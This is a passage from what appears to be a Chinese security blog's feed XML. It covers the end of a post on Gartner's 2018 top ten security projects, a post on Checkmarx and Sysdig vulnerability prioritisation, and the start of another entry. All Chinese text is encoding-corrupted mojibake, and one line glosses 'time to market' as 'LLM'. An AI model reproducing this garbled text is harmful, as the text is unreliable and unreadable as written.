è®¤è¯ã€‚</p><blockquote><p>æç¤º</p><p>åœ¨å®æ–½è¯¥é¡¹ç›®æ—¶ï¼Œåº”è¯¥å…ˆé’ˆå¯¹é‚£äº›é«˜ä»·å€¼å’Œé«˜é£é™©çš„ç³»ç»Ÿã€‚é€šè¿‡åˆ†é˜¶æ®µå®æ–½ï¼Œå¯ä»¥æ›´æœ‰æ•ˆåœ°ç®¡ç†å’Œé™ä½é£é™©ã€‚</p><p>åŒæ—¶ï¼Œè¿˜éœ€è¦æŒç»­ç›‘æ§ç”¨æˆ·çš„è¡Œä¸ºï¼Œä»¥ä¾¿åŠæ—¶å‘ç°å’Œåº”å¯¹å¼‚å¸¸æƒ…å†µã€‚</p></blockquote><h2 id="âœ¨-Top-2-å—-CARTA-å¯å‘çš„æ¼æ´ç®¡ç†"><a href="#âœ¨-Top-2-å—-CARTA-å¯å‘çš„æ¼æ´ç®¡ç†" class="headerlink" title="âœ¨ Top 2 å— CARTA å¯å‘çš„æ¼æ´ç®¡ç†"></a>âœ¨ Top 2 å— CARTA å¯å‘çš„æ¼æ´ç®¡ç†</h2><p>å— Gartner çš„<a href="https://www.gartner.com/smarterwithgartner/the-gartner-it-security-approach-for-the-digital-age/">æŒç»­è‡ªé€‚åº”é£é™©ä¸ä¿¡æ¯è¯„ä¼°</a>ï¼ˆcontinuous adaptive risk and trust assessmentï¼ŒCARTAï¼‰æ–¹æ³•çš„å¯å‘ï¼Œè¯¥é¡¹ç›®è¢«è®¤ä¸ºæ˜¯æœ€ä½³çš„æ¼æ´ç®¡ç†æ–¹å¼ï¼Œå…·æœ‰æ˜¾è‘—çš„é™ä½é£é™©çš„æ½œåŠ›ã€‚</p><p>CISO å¯ä»¥è€ƒè™‘åœ¨æ¼æ´ä¿®å¤å‡ºç°é—®é¢˜æ—¶æˆ–è€…æ˜¯ IT çš„è¿è¥æ— æ³•è·Ÿä¸Šæ¼æ´çš„è¿è¥æ—¶å¯¹è¯¥é¡¹ç›®è¿›è¡Œæ¢ç´¢ã€‚</p><p>è¯¥é¡¹ç›®è™½ç„¶æ— æ³•è®©æ‚¨ä¿®å¤æ‰€æœ‰çš„æ¼æ´ï¼Œä½†æ˜¯å¯ä»¥è®©æ‚¨é€šè¿‡ä¼˜å…ˆå¤„ç†éƒ¨åˆ†æ¼æ´æ¥æ˜¾è‘—é™ä½å®‰å…¨é£é™©ã€‚</p><blockquote><p>æç¤º</p><p>CISO åº”è¯¥è®©è™šæ‹ŸåŠ©æ‰‹æˆ–è€…æ˜¯è™šæ‹Ÿæœºä¾›åº”å•†æ¥æä¾›æ”¯æŒå’ŒæœåŠ¡ï¼Œè€Œä¸æ˜¯è‡ªå·±æ¥å®ç°è¿™ä¸ªåŠŸèƒ½ã€‚å› ä¸ºè¯¥é¡¹ç›®éœ€è¦åˆ©ç”¨ä¾›åº”å•†çš„ä¸“ä¸šçŸ¥è¯†å’ŒæŠ€æœ¯èµ„æºæ¥ä¿è¯æœ‰æ•ˆæ€§å’Œå®‰å…¨æ€§ã€‚å¹¶ä¸”è¿˜éœ€è¦è€ƒè™‘ä½¿ç”¨é˜²ç«å¢™ç­‰å¯ä»¥ç¼“è§£æ§åˆ¶é£é™©çš„æªæ–½ã€‚</p></blockquote><h2 id="Top-3-ä¸»åŠ¨åé’“é±¼"><a href="#Top-3-ä¸»åŠ¨åé’“é±¼" class="headerlink" title="Top 3 ä¸»åŠ¨åé’“é±¼"></a>Top 3 ä¸»åŠ¨åé’“é±¼</h2><p>ä¸»åŠ¨åé’“é±¼çš„å—ä¼—ç¾¤ä½“æ˜¯æŒç»­é­å—è¿‡é’“é±¼å·¥å…·çš„ç»„ç»‡ï¼Œè¯¥é¡¹ç›®éœ€è¦æŠ€æœ¯æ§åˆ¶ã€ç»ˆç«¯ç”¨æˆ·æ§åˆ¶ä»¥åŠé‡å¡‘æµç¨‹ä¸‰æ–¹é¢ç­–ç•¥ã€‚</p><p>æŠ€æœ¯æ§åˆ¶è™½ç„¶å¯ä»¥å°½å¯èƒ½åœ°é˜»æ­¢é’“é±¼æ”»å‡»ï¼Œä½†ä¹Ÿéœ€è¦è®©ç”¨æˆ·æˆä¸ºé˜²å¾¡çš„ä¸€ä»½å­ã€‚</p><blockquote><p>æç¤º</p><p>CISO ä¸åº”è¯¥åªæªå‡ºçŠ¯é”™çš„ä¸ªäººæˆ–ç¾¤ä½“ï¼Œè¿˜è¦è¡¨æ‰¬é‚£äº›åšå¾—å¥½çš„äººã€‚</p><p>å»ºè®®æ‚¨ä¸ç”µå­é‚®ä»¶å®‰å…¨ä¾›åº”å•†æ²Ÿé€šï¼Œäº†è§£ä»–ä»¬æ˜¯å¦èƒ½å¤Ÿè´Ÿè´£å®æ–½ä¸»åŠ¨åé’“é±¼çš„é¡¹ç›®ã€‚å¦‚æœä»–ä»¬ä¸èƒ½æ‰¿æ‹…è¿™ä¸ªé¡¹ç›®ï¼Œäº†è§£åŸå› æ˜¯ä»€ä¹ˆï¼Œä»¥ä¾¿ä½ å¯ä»¥é‡‡å–ç›¸åº”çš„æªæ–½æˆ–å¯»æ‰¾å…¶ä»–è§£å†³æ–¹æ¡ˆã€‚</p></blockquote><h2 id="Top-4-æœåŠ¡å™¨å·¥ä½œè´Ÿè½½ä¸Šçš„åº”ç”¨ç¨‹åºæ§åˆ¶"><a href="#Top-4-æœåŠ¡å™¨å·¥ä½œè´Ÿè½½ä¸Šçš„åº”ç”¨ç¨‹åºæ§åˆ¶" class="headerlink" title="Top 4 æœåŠ¡å™¨å·¥ä½œè´Ÿè½½ä¸Šçš„åº”ç”¨ç¨‹åºæ§åˆ¶"></a>Top 4 æœåŠ¡å™¨å·¥ä½œè´Ÿè½½ä¸Šçš„åº”ç”¨ç¨‹åºæ§åˆ¶</h2><p>è¯¥é¡¹ç›®çš„å—ä¼—ç¾¤ä½“æ˜¯åœ¨æœåŠ¡å™¨è´Ÿè½½ä¸Šå¯»æ±‚â€œé»˜è®¤æ‹’ç»â€æˆ–é›¶ä¿¡ä»»å§¿æ€çš„é˜»æ­¢ã€‚</p><p>å› ä¸ºå¤§å¤šæ•°æ¶æ„è½¯ä»¶æ²¡æœ‰è¢«åˆ—å…¥ç™½åå•ï¼Œæ‰€ä»¥è¯¥é¡¹ç›®å¯ä»¥é˜»æ­¢å¤§å¤šæ•°æ¶æ„è½¯ä»¶ã€‚</p><p>MacDonald è®¤ä¸ºè¯¥é¡¹ç›®æ˜¯ä¸€ç§éå¸¸æœ‰æ•ˆå’Œå¼ºå¤§çš„å®‰å…¨æªæ–½ï¼Œå› ä¸ºå®ƒå·²è¢«è¯æ˜åœ¨é˜²èŒƒ<a href="https://www.gartner.com/smarterwithgartner/5-ways-to-prevent-a-spectre-or-meltdown-attack/">Spectre å’Œ Meltdown</a>è¿™ä¸¤ç§æ¼æ´æ”»å‡»æ–¹é¢éå¸¸æˆåŠŸã€‚</p><blockquote><p>æç¤º</p><p>åº”ç”¨ç¨‹åºæ§åˆ¶ä¸å†…å­˜ä¿æŠ¤ä¸¤è€…äº’è¡¥ï¼Œåº”è¯¥ç»“åˆèµ·æ¥ï¼Œå…±åŒæé«˜ç³»ç»Ÿçš„æ•´ä½“å®‰å…¨ã€‚</p><p>è¯¥é¡¹ç›®ç‰¹åˆ«é€‚åˆç‰©è”ç½‘å’Œä¸å†å—åˆ°ä¾›åº”å•†æ”¯æŒçš„ç³»ç»Ÿï¼Œå› ä¸ºè¿™äº›ç³»ç»Ÿå¾€å¾€æ›´å®¹æ˜“å—åˆ°æ”»å‡»ï¼Œè€Œå…¨é¢çš„å†…å­˜ä¿æŠ¤å¯ä»¥æé«˜å®ƒä»¬çš„å®‰å…¨æ€§ã€‚</p></blockquote><h2 id="Top-5-å¾®åˆ†æ®µå’Œæµé‡å¯è§†åŒ–"><a href="#Top-5-å¾®åˆ†æ®µå’Œæµé‡å¯è§†åŒ–" class="headerlink" title="Top 5 å¾®åˆ†æ®µå’Œæµé‡å¯è§†åŒ–"></a>Top 5 å¾®åˆ†æ®µå’Œæµé‡å¯è§†åŒ–</h2><p>è¯¥é¡¹ç›®çš„å—ä¼—ç¾¤ä½“æ˜¯å¸Œæœ›åœ¨æ•°æ®ä¸­å¿ƒå†…å¯¹æµé‡è¿›è¡Œå¯è§†åŒ–å’Œæ§åˆ¶çš„å…·æœ‰å¹³é¢ç½‘ç»œæ‹“æ‰‘çš„ç»„ç»‡ï¼ˆæ— è®ºæ˜¯æœ¬åœ°è¿˜æ˜¯ IaaSï¼‰ã€‚</p><p>æ­£å¦‚ MacDonald æ‰€è¨€ï¼šâ€œå¦‚æœåäººæ¥äº†ï¼Œä»–ä»¬æ— æ³•åœ¨è¿™æ ·çš„ç¯å¢ƒä¸­ä¸ºæ‰€æ¬²ä¸ºã€‚â€ï¼Œè¯¥é¡¹ç›®çš„ç›®æ ‡æ˜¯ï¼šé˜»æ­¢æ•°æ®ä¸­å¿ƒæ”»å‡»çš„æ¨ªå‘æ‰©æ•£ã€‚</p><blockquote><p>æç¤º</p><p>åœ¨å®æ–½å¾®åˆ†æ®µï¼ˆmicrosegmentationï¼‰æ—¶ï¼Œåº”è¯¥ä»¥å¢å¼ºå¯è§æ€§ä½œä¸ºåˆ†æ®µçš„èµ·ç‚¹ï¼Œä»¥ä¾¿æ›´å¥½åœ°äº†è§£ç½‘ç»œæµé‡å’Œå®‰å…¨éœ€æ±‚ã€‚ä½†æ˜¯ï¼Œä¸è¦è¿‡åº¦ç»†åˆ†ç½‘ç»œï¼Œä»¥å…å¢åŠ ç®¡ç†å¤æ‚æ€§ã€‚</p><p>å»ºè®®ä»å…³é”®åº”ç”¨ç¨‹åºå¼€å§‹åˆ†æ®µï¼Œå¹¶è¦æ±‚ä¾›åº”å•†æ”¯æŒæœ¬åœ°åˆ†æ®µæŠ€æœ¯ï¼Œä»¥æé«˜å®æ–½å¾®åˆ†æ®µçš„æ•ˆæœå’Œæ•ˆç‡ã€‚</p></blockquote><h2 id="Top-6-æ£€æµ‹ä¸å“åº”"><a href="#Top-6-æ£€æµ‹ä¸å“åº”" class="headerlink" title="Top 6 æ£€æµ‹ä¸å“åº”"></a>Top 6 æ£€æµ‹ä¸å“åº”</h2><p>è¯¥é¡¹ç›®çš„å—ä¼—ç¾¤ä½“æ˜¯å·²ç»æ„è¯†åˆ°è¢«æ”»å‡»æ˜¯ä¸å¯é¿å…çš„ç»„ç»‡ï¼Œä»–ä»¬æ­£åœ¨å¯»æ‰¾ç«¯ç‚¹ã€ç½‘ç»œæˆ–åŸºäºç”¨æˆ·æ–¹é¢çš„æ–¹æ³•æ¥æ£€æµ‹ã€è°ƒæŸ¥å’Œåº”å¯¹é«˜çº§å¨èƒã€‚è¯¥é¡¹ç›®æœ‰ä»¥ä¸‹ä¸‰ç§å˜ä½“å¯ä¾›é€‰æ‹©ï¼š</p><ul><li>ç»ˆç«¯ä¿æŠ¤å¹³å°ï¼ˆEPPï¼‰+ ç»ˆç«¯æ£€æµ‹å’Œå“åº”ï¼ˆEDRï¼‰</li><li>ç”¨æˆ·å’Œå®ä½“è¡Œä¸ºåˆ†æï¼ˆUEBAï¼‰</li><li>Deception</li></ul><p>Deception æ˜¯ä¸€ä¸ªå°å‹ä½†æ–°å…´çš„å¸‚åœºè¶‹åŠ¿æˆ–é€‰æ‹©ï¼Œå¯ä»¥å¸®åŠ©ç»„ç»‡åŠ å¼ºå¨èƒæ£€æµ‹æœºåˆ¶ï¼Œå¹¶æä¾›é«˜åº¦å‡†ç¡®çš„äº‹ä»¶ä¿¡æ¯ã€‚</p><blockquote><p>æç¤º</p><p>å»ºè®®å‘ EPP ä¾›åº”å•†æ–½åŠ å‹åŠ›ï¼Œè¦æ±‚ä»–ä»¬æä¾› EDR åŠŸèƒ½ï¼ŒåŒæ—¶å‘ SIEMï¼ˆå®‰å…¨ä¿¡æ¯å’Œäº‹ä»¶ç®¡ç†ï¼‰ä¾›åº”å•†æ–½åŠ å‹åŠ›ï¼Œè¦æ±‚ä»–ä»¬æä¾›ç”¨æˆ·å’Œå®ä½“è¡Œä¸ºåˆ†æï¼ˆUEBAï¼‰åŠŸèƒ½ã€‚</p><p>å¹¶ä¸”ï¼Œå»ºè®®è¦æ±‚æä¾›ä¸°å¯Œçš„æ¬ºéª—ç›®æ ‡ç»„åˆï¼Œè€ƒè™‘ç›´æ¥ä»ä¾›åº”å•†é‚£é‡Œè·å– MDRï¼ˆå¨èƒæ£€æµ‹ä¸å“åº”ï¼‰çš„â€œè½»é‡çº§â€æœåŠ¡ã€‚</p></blockquote><h2 id="âœ¨-Top-7-äº‘å®‰å…¨æ€åŠ¿ç®¡ç†ï¼ˆCSPMï¼‰"><a href="#âœ¨-Top-7-äº‘å®‰å…¨æ€åŠ¿ç®¡ç†ï¼ˆCSPMï¼‰" class="headerlink" title="âœ¨ Top 7 äº‘å®‰å…¨æ€åŠ¿ç®¡ç†ï¼ˆCSPMï¼‰"></a>âœ¨ Top 7 äº‘å®‰å…¨æ€åŠ¿ç®¡ç†ï¼ˆCSPMï¼‰</h2><p>è‹¥æ‚¨çš„å›¢é˜Ÿéœ€è¦å¯¹ IaaS æˆ– PaaS çš„äº‘å®‰å…¨æ€åŠ¿è¿›è¡Œå…¨é¢åœ°ã€è‡ªåŠ¨åŒ–ç®¡ç†ï¼Œä»¥ä¾¿è¯†åˆ«ä¸¥é‡çš„é£é™©ï¼Œæ‚¨å¯ä»¥è€ƒè™‘è¯¥é¡¹ç›®ã€‚</p><p>æ‚¨å¯ä»¥é€‰æ‹©åŒ…æ‹¬äº‘è®¿é—®å®‰å…¨ä»£ç†ï¼ˆCASBï¼‰åœ¨å†…çš„å¤šä¸ªä¾›åº”å•†ã€‚</p><blockquote><p>æç¤º</p><p>å¦‚æœæ‚¨åªæœ‰ä¸€ä¸ª IaaSï¼Œè¯·å…ˆçœ‹çœ‹ Amazon å’Œ Microsoftï¼Œå¹¶å°†æ­¤ä½œä¸ºæ‚¨çš„ CASB ä¾›åº”å•†çš„éœ€æ±‚ã€‚</p></blockquote><h2 id="âœ¨-Top-8-è‡ªåŠ¨åŒ–å®‰å…¨æ‰«æ"><a href="#âœ¨-Top-8-è‡ªåŠ¨åŒ–å®‰å…¨æ‰«æ" class="headerlink" title="âœ¨ Top 8 è‡ªåŠ¨åŒ–å®‰å…¨æ‰«æ"></a>âœ¨ Top 8 è‡ªåŠ¨åŒ–å®‰å…¨æ‰«æ</h2><p>è¯¥é¡¹ç›®é€‚ç”¨äºå¸Œæœ›å°†å®‰å…¨èå…¥ DevOps å·¥ä½œæµçš„å›¢é˜Ÿã€‚å»ºè®®å…ˆä»å¼€æºç»„ä»¶æˆä»½åˆ†æå¼€å§‹ï¼Œç„¶åå°†æ‰«ææµç¨‹æ— ç¼é›†æˆåˆ° DevSecOps ä¸­ï¼Œå…¶ä¸­è¿˜åŒ…æ‹¬å®¹å™¨æŠ€æœ¯ã€‚</p><blockquote><p>æç¤º</p><p>ä¸è¦è®©å¼€å‘äººå‘˜æ›´æ¢å·¥å…·ï¼Œåº”è¯¥æä¾›å…¨é¢çš„ API æ”¯æŒä»¥å®ç°è‡ªåŠ¨åŒ–ã€‚</p></blockquote><h2 id="âœ¨-Top-9-äº‘è®¿é—®å®‰å…¨ä»£ç†ï¼ˆCASBï¼‰"><a href="#âœ¨-Top-9-äº‘è®¿é—®å®‰å…¨ä»£ç†ï¼ˆCASBï¼‰" class="headerlink" title="âœ¨ Top 9 äº‘è®¿é—®å®‰å…¨ä»£ç†ï¼ˆCASBï¼‰"></a>âœ¨ Top 9 äº‘è®¿é—®å®‰å…¨ä»£ç†ï¼ˆCASBï¼‰</h2><p>è¯¥é¡¹ç›®é€‚ç”¨äºå…·æœ‰ç§»åŠ¨åŠ³åŠ¨åŠ›çš„å›¢é˜Ÿï¼Œä¾‹å¦‚è¿œç¨‹åŠå…¬ã€å‡ºå·®æˆ–å®¢æˆ·ç°åœºå·¥ä½œç­‰ã€‚è¿™ç±»çš„ç»„ç»‡å¸Œæœ›æœ‰ä¸€ç§æ–¹æ³•å¯ä»¥é›†ä¸­ç›‘æ§å’Œç®¡ç†ä»–ä»¬çš„å‘˜å·¥åœ¨ä¸åŒä¼ä¸šå’Œäº‘æœåŠ¡ä¸­çš„æ´»åŠ¨ï¼Œä»¥æé«˜æ•ˆç‡å’Œå®‰å…¨æ€§ã€‚</p><blockquote><p>æç¤º</p><p>åœ¨å¼€å¯è¯¥é¡¹ç›®ä¹‹å‰ï¼Œéœ€è¦å¯¹ç»„ç»‡å†…éƒ¨çš„ä¿¡æ¯è¿›è¡Œè°ƒæŸ¥å’Œè¯†åˆ«ï¼Œä»¥ç¡®å®šè¯¥é¡¹ç›®çš„å¿…è¦æ€§ã€‚</p><p>åœ¨ 2018 å¹´å’Œ 2019 å¹´ï¼Œå‘ç°å’Œç›‘æ§æ•æ„Ÿæ•°æ®è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„æ–¹å‘ã€‚</p></blockquote><h2 id="Top-10-è½¯ä»¶å®šä¹‰è¾¹ç•Œ"><a href="#Top-10-è½¯ä»¶å®šä¹‰è¾¹ç•Œ" class="headerlink" title="Top 10 è½¯ä»¶å®šä¹‰è¾¹ç•Œ"></a>Top 10 è½¯ä»¶å®šä¹‰è¾¹ç•Œ</h2><p>è¯¥é¡¹ç›®é€‚ç”¨äºé‚£äº›ä»…å¸Œæœ›å°†æ•°å­—ç³»ç»Ÿå’Œä¿¡æ¯æš´éœ²ç»™æŒ‡å®šçš„å¤–éƒ¨åˆä½œä¼™ä¼´ã€è¿œç¨‹å·¥ä½œäººå‘˜å’Œæ‰¿åŒ…å•†ä»¥å‡å°æ”»å‡»é¢çš„ç»„ç»‡ã€‚</p><blockquote><p>æç¤º</p><p>ä¼ ç»Ÿçš„ VPN å¯èƒ½å­˜åœ¨ä¸€äº›å®‰å…¨é£é™©ï¼Œä¾‹å¦‚ï¼šéš¾ä»¥ç®¡ç†çš„è®¿é—®æƒé™ã€æ•°æ®æ³„éœ²çš„é£é™©ç­‰ã€‚å›¢é˜Ÿéœ€è¦é‡æ–°è¯„ä¼°åŸºäº VPN è®¿é—®çš„é£é™©ï¼Œå¹¶åœ¨ 2018 å¹´è¯•ç‚¹éƒ¨ç½²ï¼Œå°†å…¶ä½œä¸ºé“¾æ¥åˆ°åˆä½œä¼™ä¼´çš„æ•°å­—ä¸šåŠ¡æœåŠ¡çš„ç”¨ä¾‹ã€‚</p></blockquote><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ¬æ–‡ï¼Œæˆ‘ä»¬è§£è¯»äº† Gartner 2018 å¹´åå¤§å®‰å…¨é¡¹ç›®ï¼Œæ ‡æ³¨äº†åœ¨å½“æ—¶çœ‹æ¥æœ€å€¼å¾—å…³æ³¨çš„å‡ ä¸ªäº‘åŸç”Ÿå®‰å…¨é¡¹ç›®ï¼š</p><ul><li>Top 2 å— CARTA å¯å‘çš„æ¼æ´ç®¡ç†</li><li>Top 7 äº‘å®‰å…¨æ€åŠ¿ç®¡ç†ï¼ˆCSPMï¼‰</li><li>Top 8 è‡ªåŠ¨åŒ–å®‰å…¨æ‰«æ</li><li>Top 9 äº‘è®¿é—®å®‰å…¨ä»£ç†ï¼ˆCASBï¼‰</li></ul><p>æ—©åœ¨ 2018 å¹´ï¼Œè¡Œä¸šé¢†èˆªäººå°±æ„è¯†åˆ°ï¼Œå·²çŸ¥çš„æ¼æ´ä¸ä¸€å®šä¼šç»™ç»„ç»‡å¸¦æ¥çœŸå®çš„é£é™©ï¼Œæˆ‘ä»¬æ°¸è¿œä¸è¦æƒ³ç€ä¿®å¤å®Œæ‰€æœ‰çš„æ¼æ´ï¼Œå¹¶ä¸”æœ€æ—©æå‡ºäº†æ¼æ´ä¼˜å…ˆçº§çš„æ¦‚å¿µã€‚</p><p>è¦çŸ¥é“ï¼Œäº†è§£ç§‘æŠ€èµ„è®¯ï¼ŒæŠŠæ¡è¡Œä¸šè„‰æå¯¹äºå®‰å…¨ç ”ç©¶ä¹Ÿè‡³å…³é‡è¦ï¼</p>]]></content>
    
    
    
    <tags>
      
      <tag>å®‰å…¨å»ºè®¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨ Checkmarx å’Œ Sysdig æ›´å¿«åœ°ç¡®å®šæ¼æ´çš„ä¼˜å…ˆçº§</title>
    <link href="/2024/05/16/%E4%BD%BF%E7%94%A8-Checkmarx-%E5%92%8C-Sysdig-%E6%9B%B4%E5%BF%AB%E5%9C%B0%E7%A1%AE%E5%AE%9A%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BC%98%E5%85%88%E7%BA%A7/"/>
    <url>/2024/05/16/%E4%BD%BF%E7%94%A8-Checkmarx-%E5%92%8C-Sysdig-%E6%9B%B4%E5%BF%AB%E5%9C%B0%E7%A1%AE%E5%AE%9A%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BC%98%E5%85%88%E7%BA%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>åº”ç”¨ä¸Šäº‘çš„å›¢é˜Ÿå·²è¢«æ·¹æ²¡åœ¨æµ·é‡çš„æ¼æ´ä¸­äº†ï¼Œä»–ä»¬æ¯å¤©éƒ½é¢ä¸´ç€å¤§é‡çš„å‘Šè­¦ä»¥è‡³äºæ²¡æœ‰æ—¶é—´è¿›è¡Œå¤„ç†ã€‚</p><p><a href="https://sysdig.com/press-releases/checkmarx-and-sysdig/">2023 å¹´ 8 æœˆ 8 æ—¥ï¼ŒSysdig å’Œ Checkmarx å®£å¸ƒé€šè¿‡åˆä½œæ¥è§£å†³æ¼æ´è¿‡è½½çš„é—®é¢˜</a>ã€‚<a href="https://checkmarx.com/product/application-security-platform/">Checkmarx One AppSec</a>å¹³å°å¼•å…¥äº† Sysdig çš„<a href="https://sysdig.com/learn-cloud-native/cloud-security/cloud-native-application-protection-platform-cnapp-fundamentals/">äº‘åŸç”Ÿåº”ç”¨ä¿æŠ¤å¹³å°</a>ä¸­çš„è¿è¡Œæ—¶è§‚æµ‹ï¼Œæ¥å¸®åŠ©å®‰å…¨å›¢é˜Ÿå‡å°‘ 95% ä»¥ä¸Šçš„æ¼æ´å™ªéŸ³ï¼Œä»è€Œè®©å¼€å‘äººå‘˜å¿«é€Ÿåœ°è§£å†³ä»–ä»¬é¦–è¦çš„å®‰å…¨é—®é¢˜ã€‚</p><h2 id="0x01-è§£å†³çš„é—®é¢˜"><a href="#0x01-è§£å†³çš„é—®é¢˜" class="headerlink" title="0x01 è§£å†³çš„é—®é¢˜"></a>0x01 è§£å†³çš„é—®é¢˜</h2><p>å®‰å…¨å·¦ç§»çš„å…³é”®åœ¨äºï¼šç¡®ä¿å…¬å¸åœ¨æ¯ä¸€ä¸ªå¼€å‘é˜¶æ®µçš„æ—©æœŸå‡å°‘é£é™©é—®é¢˜ã€‚åœ¨æ¯ä¸€ä¸ªå¼€å‘é˜¶æ®µçš„æ—©æœŸå‘ç°å®‰å…¨æ¼æ´æ˜¯å¥½äº‹ï¼Œå¹¶ä¸”å¹¶ä¸éš¾ï¼Œéš¾çš„æ˜¯ï¼Œå¦‚ä½•åˆ¤æ–­å“ªäº›æ¼æ´æ˜¯å™ªå£°ï¼Œå“ªäº›æ¼æ´çœŸçš„ä¼šå¸¦æ¥é£é™©ã€‚å¼€å‘äººå‘˜éœ€è¦è¿™äº›ä¿¡æ¯æ¥ç¡®å®šä»–ä»¬åº”è¯¥ä¼˜å…ˆå¤„ç†å“ªäº›æ¼æ´ã€‚</p><h2 id="0x02-åŸºæœ¬åŸç†"><a href="#0x02-åŸºæœ¬åŸç†" class="headerlink" title="0x02 åŸºæœ¬åŸç†"></a>0x02 åŸºæœ¬åŸç†</h2><p>Checkmarx çš„è½¯ä»¶æˆä»½åˆ†æï¼ˆSoftware Composition Analysisï¼ŒSCAï¼‰æ˜¯<a href="https://checkmarx.com/product/application-security-platform/">Checkmarx One</a> å¹³å°çš„ä¸€éƒ¨åˆ†ï¼Œå¯ä»¥å¸®åŠ©å›¢é˜ŸæŸ¥æ‰¾ä»£ç ä¸­æ˜“å—æ”»å‡»çš„å¼€æºçš„è½¯ä»¶åŒ…å¹¶è·å–ä¿®å¤æŒ‡å—ï¼Œä»¥ä¾¿å¿«é€Ÿé™ä½å¼€æºé£é™©ã€‚</p><p>Sysdig æ·±è€•<a href="https://sysdig.com/why-runtime-insights/">è¿è¡Œæ—¶è§‚æµ‹</a>å¤šå¹´ï¼Œå¯ä»¥å¯¹æ­£åœ¨è¿è¡Œä¸­çš„å®¹å™¨é•œåƒè¿›è¡Œåˆ†æï¼Œä»¥è¯†åˆ«å‡ºæ­£åœ¨ä½¿ç”¨çš„è½¯ä»¶åŒ…ä¸­çš„æ¼æ´ï¼Œç„¶åé€šè¿‡ä¸€ç»„ APIï¼Œå°†æ­£åœ¨ä½¿ç”¨çš„è½¯ä»¶åŒ…ä¿¡æ¯æä¾›ç»™æ¼æ´ç®¡ç†ç­‰å…¶ä»–çš„å·¥å…·ã€‚</p><p>æ¼æ´ç®¡ç†å·¥å…·å†è¿‡æ»¤æ‰æœªä½¿ç”¨çš„è½¯ä»¶åŒ…ä¸­çš„æ¼æ´ï¼Œä»è€Œè®©å¼€å‘äººå‘˜å’Œå®‰å…¨å›¢é˜Ÿä¸“æ³¨äºçœŸæ­£é‡è¦çš„äº‹æƒ…ï¼Œä¿è¯å¼€å‘å’Œäº¤ä»˜çš„é€Ÿåº¦ã€‚</p><p><img src="/image/image6-29_DF4fy3d4-h.png" alt="å›¾ 1ï¼šSysdig ä¸ Checkmarx çš„å·¥ä½œåŸç†" title="å›¾1ï¼šSysdigä¸Checkmarxçš„å·¥ä½œåŸç†"></p><h2 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h2><ul><li><p><strong>å‡å°‘æ¼æ´ç–²åŠ³ã€‚</strong></p><p>Checkmarx SCA ä¸ Sysdig Secure å°†æ¼æ´ä¿¡æ¯ä¸è¿è¡Œæ—¶ç»„ä»¶ä½¿ç”¨æƒ…å†µé›†æˆåˆ°è½¯ä»¶çš„ç”Ÿå‘½å‘¨æœŸä¸­ã€‚å¯ä»¥å¸®åŠ©ç”¨æˆ·æ¸…é™¤åœ°äº†è§£åˆ°å®¹å™¨ä¸­å„ä¸ªç»„ä»¶çš„ä½¿ç”¨æƒ…å†µå’Œæ¼æ´çš„å®é™…å½±å“ï¼Œä¸ºå¼€å‘è€…æä¾›ä¸€ä¸ªæœ‰æ•ˆçš„åé¦ˆå¾ªç¯ï¼Œä»è€Œæ˜¾è‘—åœ°å‡å°‘äº†å¼€å‘è€…çš„æ¼æ´ä¿®å¤çš„å·¥ä½œé‡ã€‚</p></li><li><p><strong>é›†ä¸­ä¿®å¤&#x3D;æ›´å¿«åœ°äº¤ä»˜ã€‚</strong></p><p>æ›´æ—©ã€æ›´æœ‰æ•ˆåœ°å¯¹å®‰å…¨é£é™©è¿›è¡Œæ£€æµ‹å’Œå“åº”èƒ½å¤Ÿå¯¹å¼€å‘äººå‘˜çš„ç”Ÿäº§åŠ›äº§ç”Ÿæ›´ç§¯æçš„å½±å“ã€‚è‹¥èƒ½å¤Ÿæ›´å¤šåœ°å…³æ³¨åº”ç”¨ç¨‹åºçš„å®é™…å¼€å‘æƒ…å†µå’Œéƒ¨ç½²ç¯å¢ƒï¼Œè€Œä¸æ˜¯å¯¹ä¸å¿…è¦çš„æ¼æ´è¿›è¡Œä¿®å¤ï¼Œé‚£ä¹ˆå›¢é˜Ÿå°†èƒ½æ›´å¥½åœ°è·Ÿä¸Šè½¯ä»¶äº¤ä»˜çš„æ­¥ä¼ï¼Œä»è€ŒåŠ å¿«ä¸Šå¸‚æ—¶é—´ï¼ˆLLMï¼‰ã€‚</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>å®¹å™¨å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆ©ç”¨ Risk Spotlight æ¶ˆé™¤å™ªéŸ³å¹¶ä¼˜å…ˆå¤„ç†çœŸæ­£é‡è¦çš„æ¼æ´</title>
    <link href="/2024/05/13/%E5%88%A9%E7%94%A8-Risk-Spotlight-%E6%B6%88%E9%99%A4%E5%99%AA%E9%9F%B3%E5%B9%B6%E4%BC%98%E5%85%88%E5%A4%84%E7%90%86%E7%9C%9F%E6%AD%A3%E9%87%8D%E8%A6%81%E7%9A%84%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/05/13/%E5%88%A9%E7%94%A8-Risk-Spotlight-%E6%B6%88%E9%99%A4%E5%99%AA%E9%9F%B3%E5%B9%B6%E4%BC%98%E5%85%88%E5%A4%84%E7%90%86%E7%9C%9F%E6%AD%A3%E9%87%8D%E8%A6%81%E7%9A%84%E6%BC%8F%E6%B4%9E/</url>
    
